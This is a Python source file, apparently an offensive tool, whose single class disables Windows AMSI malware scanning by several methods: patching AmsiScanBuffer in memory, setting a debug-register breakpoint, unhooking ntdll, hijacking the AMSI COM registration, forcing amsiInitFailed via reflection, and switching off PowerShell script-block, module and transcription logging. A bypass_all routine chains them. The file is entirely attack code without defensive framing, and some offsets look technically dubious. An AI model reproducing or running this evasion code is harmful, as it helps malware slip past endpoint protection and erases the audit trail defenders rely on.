import ctypes
import ctypes.wintypes as wintypes
import struct
import sys
from ctypes import windll, POINTER, byref, c_void_p, c_uint, c_ulong

class AdvancedAMSIBypass:
    def __init__(self):
        self.kernel32 = windll.kernel32
        self.ntdll = windll.ntdll
        self.amsi_patched = False
        
    def bypass_amsi_hardware_bp(self):
        try:
            amsi_dll = self.kernel32.GetModuleHandleW("amsi.dll")
            if not amsi_dll:
                return False
                
            amsi_scan_buffer = self.kernel32.GetProcAddress(amsi_dll, b"AmsiScanBuffer")
            if not amsi_scan_buffer:
                return False
            
            CONTEXT_DEBUG_REGISTERS = 0x00000010
            context = (c_ulong * 716)()
            context[0] = CONTEXT_DEBUG_REGISTERS
            
            current_thread = self.kernel32.GetCurrentThread()
            
            if not self.kernel32.GetThreadContext(current_thread, byref(context)):
                return False
            
            context[4] = amsi_scan_buffer
            context[24] = 0x00000001
            
            result = self.kernel32.SetThreadContext(current_thread, byref(context))
            if result:
                self.amsi_patched = True
            return result != 0
            
        except Exception:
            return False
    
    def bypass_amsi_memory_patch(self):
        try:
            amsi_dll = self.kernel32.GetModuleHandleW("amsi.dll")
            if not amsi_dll:
                return False
                
            amsi_scan_buffer = self.kernel32.GetProcAddress(amsi_dll, b"AmsiScanBuffer")
            if not amsi_scan_buffer:
                return False
            
            PAGE_EXECUTE_READWRITE = 0x40
            old_protect = c_ulong()
            
            patch_bytes = b"\x31\xC0\xC3"
            
            result = self.kernel32.VirtualProtect(
                amsi_scan_buffer, 
                len(patch_bytes), 
                PAGE_EXECUTE_READWRITE, 
                byref(old_protect)
            )
            
            if not result:
                return False
            
            ctypes.memmove(amsi_scan_buffer, patch_bytes, len(patch_bytes))
            
            self.kernel32.VirtualProtect(
                amsi_scan_buffer, 
                len(patch_bytes), 
                old_protect.value, 
                byref(old_protect)
            )
            
            self.amsi_patched = True
            return True
            
        except Exception:
            return False
    
    def bypass_amsi_dll_unhooking(self):
        try:
            ntdll_base = self.kernel32.GetModuleHandleW("ntdll.dll")
            if not ntdll_base:
                return False
            
            dos_header = ctypes.c_char_p(ntdll_base)
            if dos_header.value[:2] != b"MZ":
                return False
            
            e_lfanew = struct.unpack("<L", dos_header.value[60:64])[0]
            nt_header = ntdll_base + e_lfanew
            
            characteristics_offset = 22
            characteristics = struct.unpack("<H", 
                ctypes.string_at(nt_header + characteristics_offset, 2))[0]
            
            if characteristics & 0x2000:
                return True
                
            return self.unhook_ntdll_functions()
            
        except Exception:
            return False
    
    def bypass_amsi_com_hijack(self):
        try:
            import winreg
            
            clsid_amsi = "{fdb00e52-a214-4aa1-8fba-4357bb0072ec}"
            
            key_path = f"SOFTWARE\\Classes\\CLSID\\{clsid_amsi}\\InprocServer32"
            
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, 
                                   winreg.KEY_SET_VALUE)
            except FileNotFoundError:
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            
            fake_dll_path = "C:\\Windows\\System32\\mshtml.dll"
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, fake_dll_path)
            winreg.CloseKey(key)
            
            self.amsi_patched = True
            return True
            
        except Exception:
            return False
    
    def bypass_amsi_reflection(self):
        try:
            import sys
            import importlib.util
            
            if 'System' not in sys.modules:
                return False
            
            clr = sys.modules.get('clr')
            if not clr:
                return False
            
            clr.AddReference("System")
            from System import Type
            from System.Reflection import Assembly, BindingFlags
            
            amsi_utils = Type.GetType("System.Management.Automation.AmsiUtils")
            if amsi_utils:
                amsi_init_failed = amsi_utils.GetField("amsiInitFailed", 
                    BindingFlags.NonPublic | BindingFlags.Static)
                if amsi_init_failed:
                    amsi_init_failed.SetValue(None, True)
                    self.amsi_patched = True
                    return True
            
            return False
            
        except Exception:
            return False
    
    def bypass_amsi_powershell_logging(self):
        try:
            import winreg
            
            logging_keys = [
                "SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging",
                "SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",
                "SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription"
            ]
            
            for key_path in logging_keys:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, 
                                       winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "EnableModuleLogging", 0, winreg.REG_DWORD, 0)
                    winreg.SetValueEx(key, "EnableScriptBlockLogging", 0, winreg.REG_DWORD, 0)
                    winreg.SetValueEx(key, "EnableTranscripting", 0, winreg.REG_DWORD, 0)
                    winreg.CloseKey(key)
                except:
                    continue
            
            return True
            
        except Exception:
            return False
    
    def unhook_ntdll_functions(self):
        try:
            ntdll_handle = self.kernel32.GetModuleHandleW("ntdll.dll")
            if not ntdll_handle:
                return False
            
            file_handle = self.kernel32.CreateFileW(
                "C:\\Windows\\System32\\ntdll.dll",
                0x80000000,
                1,
                None,
                3,
                0,
                None
            )
            
            if file_handle == -1:
                return False
            
            mapping = self.kernel32.CreateFileMappingW(file_handle, None, 2, 0, 0, None)
            if not mapping:
                self.kernel32.CloseHandle(file_handle)
                return False
            
            mapped_dll = self.kernel32.MapViewOfFile(mapping, 4, 0, 0, 0)
            if not mapped_dll:
                self.kernel32.CloseHandle(mapping)
                self.kernel32.CloseHandle(file_handle)
                return False
            
            dos_header = ctypes.c_char_p(mapped_dll)
            if dos_header.value[:2] != b"MZ":
                self.cleanup_mapping(file_handle, mapping, mapped_dll)
                return False
            
            e_lfanew = struct.unpack("<L", dos_header.value[60:64])[0]
            nt_header = mapped_dll + e_lfanew
            
            optional_header_offset = 24
            text_section_rva = struct.unpack("<L", 
                ctypes.string_at(nt_header + optional_header_offset + 16, 4))[0]
            text_section_size = struct.unpack("<L", 
                ctypes.string_at(nt_header + optional_header_offset + 20, 4))[0]
            
            PAGE_EXECUTE_READWRITE = 0x40
            old_protect = c_ulong()
            
            text_section_va = ntdll_handle + text_section_rva
            
            result = self.kernel32.VirtualProtect(
                text_section_va,
                text_section_size,
                PAGE_EXECUTE_READWRITE,
                byref(old_protect)
            )
            
            if result:
                ctypes.memmove(
                    text_section_va,
                    mapped_dll + text_section_rva,
                    text_section_size
                )
                
                self.kernel32.VirtualProtect(
                    text_section_va,
                    text_section_size,
                    old_protect.value,
                    byref(old_protect)
                )
            
            self.cleanup_mapping(file_handle, mapping, mapped_dll)
            return result != 0
            
        except Exception:
            return False
    
    def cleanup_mapping(self, file_handle, mapping, mapped_dll):
        if mapped_dll:
            self.kernel32.UnmapViewOfFile(mapped_dll)
        if mapping:
            self.kernel32.CloseHandle(mapping)
        if file_handle and file_handle != -1:
            self.kernel32.CloseHandle(file_handle)
    
    def is_amsi_bypassed(self):
        return self.amsi_patched
    
    def bypass_all(self):
        methods = [
            self.bypass_amsi_hardware_bp,
            self.bypass_amsi_memory_patch,
            self.bypass_amsi_dll_unhooking,
            self.bypass_amsi_com_hijack,
            self.bypass_amsi_reflection,
            self.bypass_amsi_powershell_logging
        ]
        
        success_count = 0
        for method in methods:
            try:
                if method():
                    success_count += 1
            except:
                continue
        
        return success_count > 0
